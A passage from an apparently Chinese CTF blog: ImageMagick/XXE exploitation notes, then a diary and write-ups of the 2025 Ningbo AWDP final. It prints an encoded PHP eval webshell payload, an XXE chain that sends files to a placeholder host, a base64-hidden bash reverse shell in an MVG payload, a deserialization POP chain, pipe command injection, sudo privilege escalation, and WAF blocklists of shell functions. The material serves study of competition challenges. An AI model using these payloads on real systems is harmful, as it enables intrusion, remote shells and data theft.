<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;image&gt; &lt;read filename=&quot;inline:data://image/x-portable-anymap;base64,UDYKOSA5CjI1NQoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw/cGhwIGV2YWwoJF9HRVRbMV0pOz8+fE86ODoiYmFja2Rvb3IiOjI6e3M6NDoicGF0aCI7czoxNDoiL3RtcC9zZXNzX2Fma2wiO3M6MTI6ImRvX2V4ZWNfZnVuYyI7YjowO30=&quot; /&gt; &lt;write filename=&quot;/tmp/sess_afkl&quot; /&gt; &lt;/image&gt;</code></pre>
<p>SCTF 2023 中对这种利用方式进行了探索，可以达到读取文件内容的效果。</p>
<pre><code class="highlight xml"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span> <span class="tag">&lt;<span class="name">image</span>&gt;</span> <span class="tag">&lt;<span class="name">read</span> <span class="attr">filename</span>=<span class="string">&quot;mvg:/flag&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">write</span> <span class="attr">filename</span>=<span class="string">&quot;/tmp/xxxx&quot;</span> /&gt;</span> <span class="tag">&lt;/<span class="name">image</span>&gt;</span></code></pre>
<h2 id="xxe"><a class="markdownIt-Anchor" href="#xxe"></a> XXE</h2>
<h3 id="simplexmlelement"><a class="markdownIt-Anchor" href="#simplexmlelement"></a> SimpleXMLElement</h3>
<pre><code class="highlight plaintext"> class SimpleXMLElement implements Stringable, Countable, RecursiveIterator &#123;
    /* Methods */
    public __construct(
        string $data,
        int $options = 0,
        bool $dataIsURL = false,
        string $namespaceOrPrefix = &quot;&quot;,
        bool $isPrefix = false
    )
    public addAttribute(string $qualifiedName, string $value, ?string $namespace = null): void
    public addChild(string $qualifiedName, ?string $value = null, ?string $namespace = null): ?SimpleXMLElement
    public asXML(?string $filename = null): string|bool
    public attributes(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public children(?string $namespaceOrPrefix = null, bool $isPrefix = false): ?SimpleXMLElement
    public count(): int
    public getDocNamespaces(bool $recursive = false, bool $fromRoot = true): array|false
    public getName(): string
    public getNamespaces(bool $recursive = false): array
    public registerXPathNamespace(string $prefix, string $namespace): bool
    public __toString(): string
    public xpath(string $expression): array|null|false
&#125;</code></pre>
<ul>
<li>data: xml 字符串，xml 文档路径或者 url 路径（如果 dataIsURL 为 true</li>
<li>dataIsURL: 默认情况下为 false，为 true 时 data 为一个 url 路径</li>
<li>option：设置为 LIBXML_NOENT 时，可能会导致 xxe 攻击，LIBXML_NOENT 为 2.</li>
</ul>
<p><strong>读取文件</strong></p>
<p>poc:</p>
<pre><code class="highlight plaintext">$x=new SimpleXMLElement(&quot;http://xxx.xxx.xxx.xxx/evil.xml&quot;,2,true);</code></pre>
<p>evil.xml</p>
<pre><code class="highlight plaintext">&lt;?xml version=&quot;1.0&quot;?&gt;   &lt;!DOCTYPE ANY[   &lt;!ENTITY % remote SYSTEM &quot;http://xxx.xxx.xxx.xxx/send.xml&quot;&gt;   %remote;   %all;   %send;   ]&gt;</code></pre>
<p>send.xml</p>
<pre><code class="highlight plaintext">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=index.php&quot;&gt;   &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#x27;http://xxx.xxx.xxx.xxx/send.php?file=%file;&#x27;&gt;&quot;&gt;</code></pre>
<h3 id="simplexmliterator"><a class="markdownIt-Anchor" href="#simplexmliterator"></a> <code>SimpleXMLIterator</code></h3>
<p>可用于代替 <code>SimpleXMLElement</code></p>
<h3 id="imagemagick"><a class="markdownIt-Anchor" href="#imagemagick"></a> <code>ImageMagick</code></h3>
<p>配合XXE进行RCE，参考<strong>CVE-2016-3714</strong></p>
<pre><code class="highlight plaintext">影响版本ImageMagick &lt;6.9.3-9</code></pre>
<p><code>ImageMagick</code>有一个功能叫做<code>delegate(委托)</code>，作用是调用外部的lib文件来处理文件，在这过程中会使用到系统的system命令</p>
<p>在漏洞报告中利用了/etc/ImageMagick/delegate.xml中的这一段委托</p>
<pre><code class="highlight xml"><span class="tag">&lt;<span class="name">delegate</span> <span class="attr">decode</span>=<span class="string">&quot;https&quot;</span> <span class="attr">command</span>=<span class="string">&quot;<span class="symbol">&amp;quot;</span>curl<span class="symbol">&amp;quot;</span> -s -k -o <span class="symbol">&amp;quot;</span>%o<span class="symbol">&amp;quot;</span> <span class="symbol">&amp;quot;</span>https:%M<span class="symbol">&amp;quot;</span>&quot;</span>/&gt;</span></code></pre>
<p>它在解析https文件时用curl命令将其下载，%M被直接放在curl的最后一个参数内</p>
<p><code>ImageMagick</code>默认支持<code>mvg</code>的文件格式,<code>mvg</code>与<code>svg</code>格式类似，其中是以文本形式写入矢量图的内容，而这其中包含了https的处理过程</p>
<p>我们可以构造一个<code>mvg</code>文件来进行rce(后缀不一定要用<code>.mvg</code>，<code>ImageMagick</code>自动根据上传的内容将其识别为<code>mvg</code>图片)</p>
<p>并在<a href="https://xn--jorud1bxa132l1t1f">https://后闭合双引号</a>，写入执行的命令</p>
<pre><code class="highlight svg">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://&quot;|id; &quot;)&#x27;
pop graphic-context</code></pre>
<p>反弹shell</p>
<pre><code class="highlight plaintext">push graphic-context
viewbox 0 0 640 480
fill &#x27;url(https://127.0.0.1/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguODEuMjMyLzg4ODggMD4mMQ== | base64 -d | bash`&quot;||id &quot; )&#x27;
pop graphic-context</code></pre>
]]></content>
      <tags>
        <tag>-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>记2025宁波网络安全大赛决赛</title>
    <url>/2025/09/07/%E8%AE%B02025%E5%AE%81%E6%B3%A2%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%86%B3%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="记2025宁波市网络安全大赛决赛"><a class="markdownIt-Anchor" href="#记2025宁波市网络安全大赛决赛"></a> 记2025宁波市网络安全大赛决赛</h1>
<p>纪念自己第一次参加线下赛，还是AWDP。。</p>
<p>前一天还在计划通后一天就打脸了哈哈，最后产出不是很好还是靠队友带了</p>
<p>感谢pabgbai学长和文化木的带飞😇</p>
<h2 id="day0"><a class="markdownIt-Anchor" href="#day0"></a> day0</h2>
<p>大热天和huanghunr师傅早上做高铁赶到宁波，尼姆的14点的宁波真是要人命的热啊，好在没有中暑</p>
<p>酒店的位置有点刁钻，对着地图找半天没找到以为被缺德地图坑了</p>
<p>找到指示牌结果不小心做错楼层了(然后我还不知道)</p>
<p>兜兜转转总算拿到房卡<s>铸币</s></p>
<p>晚上由于其他两个师傅(metavii和kong)来的晚了点，本来说好和老登一起去赤寿喜烧，结果去晚了他们吃完了</p>
<p>号还没到下去溜了一圈都没有发现号过了，前面要等100多桌</p>
<p>含泪走进神必火锅店爆了米</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907192822423.png" alt="image-20250907192822423"></p>
<p>貌似有驻唱，但是没心情去欣赏了说是</p>
<p>回去的时候没仔细看群三个代币买了票结果工作人员给了一张免费体验地铁的券</p>
<p>嗯?坏了,变成小丑了 🤡</p>
<h2 id="day1"><a class="markdownIt-Anchor" href="#day1"></a> day1</h2>
<p>紧张刺激的AWD</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907193950287.png" alt="image-20250907193950287"></p>
<p>3h break+2h fix</p>
<p>赛题会放在下面的(你先别急)</p>
<p>11:30之前零产出血压直升，感觉都卡在了某个关键的地方，但是好在肾上腺素发力了出了两道还有一道3解一道0解题卡到最后半小时我直接去fix了</p>
<p>fix第一轮感觉没什么问题，waf拉满结果第一轮check一个没过</p>
<p>血压又高了。。</p>
<p>我以为是漏洞点没修全不给过，就把那几个整数溢出修掉了结果第二轮还是没过就过了一个上waf(听huanghunr师傅说这道题他们一样的修第一轮没过第二轮过了，就加了最重要的管道符)</p>
<p>中间还有小插曲:平台崩掉了</p>
<p>虽然对fix影响不是特别大但是还是给大家乐得不行</p>
<p>最后只有一个fix遗憾退场，一个php反序列化挂满waf不知道为什么没过啊，还有一个原型链服务器显示被waf了还是没check过也是没话好说i</p>
<p>晚上和一堆老登出去恰饭，哎我 这牛排不赖😋</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194327171.png" alt></p>
<p>又去逛了一下谷子店,看到了挺多ip但是没看到爱马仕啊…又遗憾离场了</p>
<p>最大的惊喜可能还是只看到海报没看到周边的点兔,绷</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250907194654176.png" alt="image-20250907194654176"></p>
<p>当然其实也收获了很多吧，会进攻不一定会防守，还有发现自己的代码审计跟上来了但是自己搓一些片段/脚本还是和史一样之类的。。</p>
<p>其他图片没怎么拍，没啥心情(因为第二天就要返校了，又要上垃圾没营养的水课了懒得喷)，而且成果也一般，更没心情了，回来的路上一直在想接下来该怎么整才能提升自己的效率。但是又不能太过于急切到时候根基不稳，离一个能够上桌的weber，怕还是有好一段路要走。</p>
<h2 id="wp"><a class="markdownIt-Anchor" href="#wp"></a> WP</h2>
<h3 id="easyupload"><a class="markdownIt-Anchor" href="#easyupload"></a> easyUpload</h3>
<p>普通上传一张没回显上传路径,F12看一眼</p>
<p>发现了<code>show.php?file=</code>明显的任意文件读</p>
<p>当时不知道怎么了脑抽了没去读源码</p>
<p>读到index.php</p>
<h4 id="break"><a class="markdownIt-Anchor" href="#break"></a> break</h4>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
Class Dog &#123;
    <span class="keyword">public</span> <span class="variable">$bone</span>;
    <span class="keyword">public</span> <span class="variable">$meat</span>;
    <span class="keyword">public</span> <span class="variable">$beef</span>;
    <span class="keyword">public</span> <span class="variable">$candy</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;
        <span class="keyword">if</span> ((<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;meat) == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;meat != <span class="variable language_">$this</span>-&gt;beef)) &#123;
            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;candy-&gt;flag;
        &#125;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;
        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;bone;
        <span class="keyword">return</span> <span class="variable">$function</span>();
    &#125;
&#125;

CLass mouse &#123;
    <span class="keyword">public</span> <span class="variable">$rice</span>;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;
        @<span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;rice);
    &#125;
&#125;

<span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;
    <span class="keyword">public</span> <span class="variable">$fish</span>;
    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;
    &#125;

    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;
        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fish;
    &#125;
&#125;

<span class="comment">// 处理文件上传</span>
<span class="variable">$message</span> = <span class="string">&#x27;&#x27;</span>;
<span class="variable">$success</span> = <span class="literal">false</span>;
<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;POST&#x27;</span>) &#123;
    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>])) &#123;
        <span class="variable">$uploadDir</span> = <span class="keyword">__DIR__</span> . <span class="string">&#x27;/uploads/&#x27;</span>;
        <span class="variable">$uploadedFile</span> = <span class="variable">$uploadDir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);

        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadedFile</span>)) &#123;
            <span class="variable">$message</span> = <span class="string">&#x27;上传成功！&#x27;</span>;
            <span class="variable">$success</span> = <span class="literal">true</span>;

            <span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploadedFile</span>);
            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$uploadedFile</span>);

            @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$fileContent</span>);
            <span class="variable">$fileContent</span> = <span class="string">&quot;&quot;</span>;

            <span class="comment">// 设置 session，表示上传成功</span>
            <span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>] = <span class="literal">true</span>;

            <span class="comment">// 重定向，防止刷新页面时重复提交表单</span>
            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: &quot;</span> . <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]);
            <span class="keyword">echo</span> <span class="variable">$message</span>;
            <span class="keyword">exit</span>();
        &#125;
    &#125;
&#125;
<span class="meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html lang=<span class="string">&quot;zh-CN&quot;</span>&gt;
&lt;head&gt;
    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;
    &lt;title&gt;壁纸上传网站&lt;/title&gt;
    &lt;style&gt;
        body &#123;
            background: linear-<span class="title function_ invoke__">gradient</span>(<span class="number">135</span>deg, #<span class="number">000000</span>, #ffffff);
            font-family: Arial, sans-serif;
            color: <span class="comment">#333;</span>
            display: flex;
            justify-content: center;
            align-items: center;
            height: <span class="number">100</span>vh;
            margin: <span class="number">0</span>;
        &#125;
        .container &#123;
            text-align: center;
            background: <span class="title function_ invoke__">rgba</span>(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">0.9</span>);
            padding: <span class="number">30</span>px;
            border-radius: <span class="number">10</span>px;
            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">15</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0.2</span>);
            width: <span class="number">400</span>px;
        &#125;
        h1 &#123;
            font-size: <span class="number">24</span>px;
            margin-bottom: <span class="number">20</span>px;
            color: <span class="comment">#000;</span>
        &#125;
        .message &#123;
            font-size: <span class="number">18</span>px;
            color: green;
            margin-bottom: <span class="number">20</span>px;
        &#125;
        input[type=<span class="string">&quot;file&quot;</span>] &#123;
            margin: <span class="number">20</span>px <span class="number">0</span>;
            font-size: <span class="number">16</span>px;
        &#125;
        input[type=<span class="string">&quot;submit&quot;</span>] &#123;
            background-color: <span class="comment">#333;</span>
            color: <span class="comment">#fff;</span>
            border: none;
            padding: <span class="number">10</span>px <span class="number">20</span>px;
            cursor: pointer;
            border-radius: <span class="number">5</span>px;
        &#125;
        input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;
            background-color: <span class="comment">#555;</span>
        &#125;
        .images &#123;
            margin-top: <span class="number">40</span>px;
        &#125;
        .images-title &#123;
            font-size: <span class="number">20</span>px;
            font-weight: bold;
            margin-bottom: <span class="number">20</span>px;
            color: <span class="comment">#444;</span>
        &#125;
        .image-item &#123;
            display: inline-block;
            margin: <span class="number">0</span> <span class="number">10</span>px;
        &#125;
        .image-item img &#123;
            width: <span class="number">150</span>px;
            height: <span class="number">150</span>px;
            border-radius: <span class="number">10</span>px;
            border: <span class="number">2</span>px solid <span class="comment">#333;</span>
            transition: transform <span class="number">0.3</span>s;
        &#125;
        .image-item img:hover &#123;
            transform: <span class="title function_ invoke__">scale</span>(<span class="number">1.1</span>);
        &#125;
        .image-item a &#123;
            display: block;
            margin-top: <span class="number">10</span>px;
            color: <span class="comment">#333;</span>
            text-decoration: none;
            font-weight: bold;
        &#125;
        .image-item a:hover &#123;
            color: <span class="comment">#555;</span>
        &#125;
    &lt;/style&gt;
    &lt;script&gt;
        <span class="function"><span class="keyword">function</span> <span class="title">showSuccessAlert</span>(<span class="params"></span>) </span>&#123;
            <span class="title function_ invoke__">alert</span>(<span class="string">&quot;文件上传成功！&quot;</span>);
        &#125;

        <span class="comment">// 页面加载后检查是否上传成功</span>
        window.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;
            <span class="meta">&lt;?php</span> <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]) : <span class="meta">?&gt;</span>
            <span class="title function_ invoke__">showSuccessAlert</span>();
            <span class="meta">&lt;?php</span>
            <span class="comment">// 清除 session 中的上传成功状态</span>
            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;upload_success&#x27;</span>]);
            <span class="keyword">endif</span>;
            <span class="meta">?&gt;</span>
        &#125;
    &lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span>
<span class="class">    &lt;<span class="title">h1</span>&gt;壁纸上传网站&lt;/<span class="title">h1</span>&gt;</span>
<span class="class">    &lt;?<span class="title">php</span> <span class="title">if</span> (!<span class="title">empty</span>($<span class="title">message</span>)) : ?&gt;</span>
<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">message</span>; ?&gt;&lt;/<span class="title">div</span>&gt;</span>
<span class="class">    &lt;?<span class="title">php</span> <span class="title">endif</span>; ?&gt;</span>
<span class="class">    &lt;<span class="title">form</span> <span class="title">action</span>=&quot;&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span>
<span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">uploaded_file</span>&quot; <span class="title">required</span>&gt;</span>
<span class="class">        &lt;<span class="title">br</span>&gt;</span>
<span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;上传&quot;&gt;</span>
<span class="class">    &lt;/<span class="title">form</span>&gt;</span>
<span class="class"></span>
<span class="class">    &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">images</span>&quot;&gt;</span>
<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">images</span>-<span class="title">title</span>&quot;&gt;精美壁纸如下：&lt;/<span class="title">div</span>&gt;</span>
<span class="class"></span>
<span class="class">        &lt;!-- 图片 1 --&gt;</span>
<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">image</span>-<span class="title">item</span>&quot;&gt;</span>
<span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;./<span class="title">img</span>/1.<span class="title">png</span>&quot; <span class="title">alt</span>=&quot;壁纸1&quot;&gt;</span>
<span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">show</span>.<span class="title">php</span>?<span class="title">file</span>=<span class="title">img</span>/1.<span class="title">png</span>&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;壁纸1&lt;/<span class="title">a</span>&gt;</span>
<span class="class">        &lt;/<span class="title">div</span>&gt;</span>
<span class="class"></span>
<span class="class">        &lt;!-- 图片 2 --&gt;</span>
<span class="class">        &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">image</span>-<span class="title">item</span>&quot;&gt;</span>
<span class="class">            &lt;<span class="title">img</span> <span class="title">src</span>=&quot;./<span class="title">img</span>/2.<span class="title">png</span>&quot; <span class="title">alt</span>=&quot;壁纸2&quot;&gt;</span>
<span class="class">            &lt;<span class="title">a</span> <span class="title">href</span>=&quot;/<span class="title">show</span>.<span class="title">php</span>?<span class="title">file</span>=<span class="title">img</span>/2.<span class="title">png</span>&quot; <span class="title">target</span>=&quot;<span class="title">_blank</span>&quot;&gt;壁纸2&lt;/<span class="title">a</span>&gt;</span>
<span class="class">        &lt;/<span class="title">div</span>&gt;</span>
<span class="class"></span>
<span class="class"></span>
<span class="class">    &lt;/<span class="title">div</span>&gt;</span>
<span class="class">&lt;/<span class="title">div</span>&gt;</span>
<span class="class">&lt;/<span class="title">body</span>&gt;</span>
<span class="class">&lt;/<span class="title">html</span>&gt;</span></code></pre>
<p>经典php反序列化，也不难</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
Class Dog &#123;
    <span class="keyword">public</span> <span class="variable">$bone</span>;
    <span class="keyword">public</span> <span class="variable">$meat</span>=<span class="number">240610708</span>;
    <span class="keyword">public</span> <span class="variable">$beef</span>=<span class="string">&quot;QNKCDZO&quot;</span>;
    <span class="keyword">public</span> <span class="variable">$candy</span>;

&#125;

CLass mouse &#123;
    <span class="keyword">public</span> <span class="variable">$rice</span>;


&#125;

<span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;
    <span class="keyword">public</span> <span class="variable">$fish</span>;


&#125;

<span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Cat</span>();
<span class="variable">$a</span>-&gt;fish = <span class="keyword">new</span> <span class="title class_">Dog</span>();
<span class="variable">$a</span>-&gt;fish-&gt;bone = <span class="keyword">new</span> <span class="title class_">Dog</span>();
<span class="variable">$a</span>-&gt;fish-&gt;bone-&gt;candy = <span class="keyword">new</span> <span class="title function_ invoke__">mouse</span>();
<span class="variable">$a</span>-&gt;fish-&gt;bone-&gt;candy-&gt;rice = <span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;
<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</code></pre>
<p>当成图片的内容提交就可以</p>
<p>还有一个show.php,忘记保存了，用file_get_contents来处理传入的file参数貌似，回头一想其实那边是可以打filter链的</p>
<p>这里fix没过就讲一下我的思路希望有师傅可以指出哪里错了(贴全文太麻烦了就把改了的部分给一下)</p>
<pre><code class="highlight php"><span class="variable">$fileContent</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploadedFile</span>);
            <span class="comment">//fix</span>
            <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|\?|\*|O|:/i&quot;</span>, <span class="variable">$fileContent</span>)) &#123;
                <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);
            &#125;
            <span class="comment">//fix</span>
            @<span class="title function_ invoke__">unlink</span>(<span class="variable">$uploadedFile</span>);</code></pre>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>) </span>&#123;
        <span class="keyword">if</span> ((<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;meat) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;beef)) &amp;&amp; (<span class="variable language_">$this</span>-&gt;meat != <span class="variable language_">$this</span>-&gt;beef)) &#123;
            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;candy-&gt;flag;
        &#125;
    &#125;
</code></pre>
<h3 id="image2base64"><a class="markdownIt-Anchor" href="#image2base64"></a> image2base64</h3>
<h4 id="break-2"><a class="markdownIt-Anchor" href="#break-2"></a> break</h4>
<pre><code class="highlight py"><span class="keyword">import</span> os
<span class="keyword">import</span> re
<span class="keyword">import</span> subprocess
<span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, jsonify

app = Flask(__name__)

UPLOAD_FOLDER = <span class="string">&#x27;uploads/&#x27;</span>
<span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER
<span class="keyword">def</span> <span class="title function_">checkname</span>(<span class="params">filename</span>):

    ILLEGAL_CHARACTERS = <span class="string">r&quot;[*=&amp;\&quot;%;&lt;&gt;iashto!@()\&#123;\&#125;\[\]_^`\&#x27;~\\#]&quot;</span>
    noip = re.<span class="built_in">compile</span>(<span class="string">r&quot;\d+\.\d+&quot;</span>)
    <span class="keyword">if</span> re.search(ILLEGAL_CHARACTERS, filename):
        <span class="keyword">return</span> <span class="literal">False</span>
    <span class="keyword">if</span> <span class="string">&quot;..&quot;</span> <span class="keyword">in</span> filename :
        <span class="keyword">return</span> <span class="literal">False</span>
    <span class="keyword">if</span>(noip.findall(filename)):
        <span class="keyword">return</span> <span class="literal">False</span>


<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span>
<span class="keyword">def</span> <span class="title function_">upload_form</span>():
    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)

<span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span>
<span class="keyword">def</span> <span class="title function_">upload_file</span>():
    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:
        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No file part in the request&quot;</span>&#125;), <span class="number">400</span>

    file = request.files[<span class="string">&#x27;file&#x27;</span>]
    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:
        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;No file selected&quot;</span>&#125;), <span class="number">400</span>
    <span class="keyword">if</span>(checkname(file.filename)==<span class="literal">False</span>):
        <span class="keyword">return</span> jsonify(&#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;Not hacking!&quot;</span>&#125;), <span class="number">500</span>
    <span class="keyword">if</span> file:
        file_path = os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], file.filename)
        file.save(file_path)
        result = subprocess.run(<span class="string">f&quot;cat <span class="subst">&#123;file_path&#125;</span> | base64&quot;</span>, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)
        encoded_string = result.stdout.strip()
        <span class="keyword">return</span> jsonify(&#123;
            <span class="string">&quot;filename&quot;</span>: file.filename,
            <span class="string">&quot;base64&quot;</span>: encoded_string
        &#125;)

<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:
    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</code></pre>
<p>看到subprocess和填充file_path马上心领神会，直接管道符(因为这里;被ban掉了)</p>
<p>后面看这个waf有点麻烦，就没去继续做</p>
<p>后面给了hint:![屏幕截图 2025-09-06 125919](<a href="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE">https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/屏幕截图</a> 2025-09-06 125919.png)</p>
<p>什么几把看不懂了。。遂不做，后面看了下别人的wp发现这里是要上传一个写了反弹shell命令的文件</p>
<p>再同样的上传，并给filename动手脚用管道符执行shell($0)</p>
<p>这里可以去看ctfshow的极限命令执行，好东西，后悔当初没去学。</p>
<p>后面是sudo免密，其实就是sudo提权读flag</p>
<pre><code class="highlight bash"><span class="built_in">sudo</span> -l</code></pre>
<p>然后发现base64是免密执行bash的</p>
<pre><code class="highlight plaintext">sudo base64 &quot;/f1111llaaa444Aaag9gggg&quot; |base64 -- decode</code></pre>
<h4 id="fix"><a class="markdownIt-Anchor" href="#fix"></a> fix</h4>
<p>fix的时候huanghunr师傅说就加了<code>|</code>，我是把它整个checkname函数给重新写了，感觉很难评的一道题</p>
<p>感觉其实原来基础上加一个<code>|</code>就能过，第一次不知道为什么没过，这边fix就不写了，不难写</p>
<h3 id="easy_shop"><a class="markdownIt-Anchor" href="#easy_shop"></a> Easy_shop</h3>
<h4 id="break-3"><a class="markdownIt-Anchor" href="#break-3"></a> break</h4>
<p>进去是一个商店购买页面，一眼盯帧就是去刷负数量</p>
<p>美滋滋吃到1500，就可以买到flag。了吗?</p>
<p>并非，后面给了个路由让我们去读flag</p>
<pre><code class="highlight plaintext">/showflag</code></pre>
<p>进去还是任意文件读，不给读flag</p>
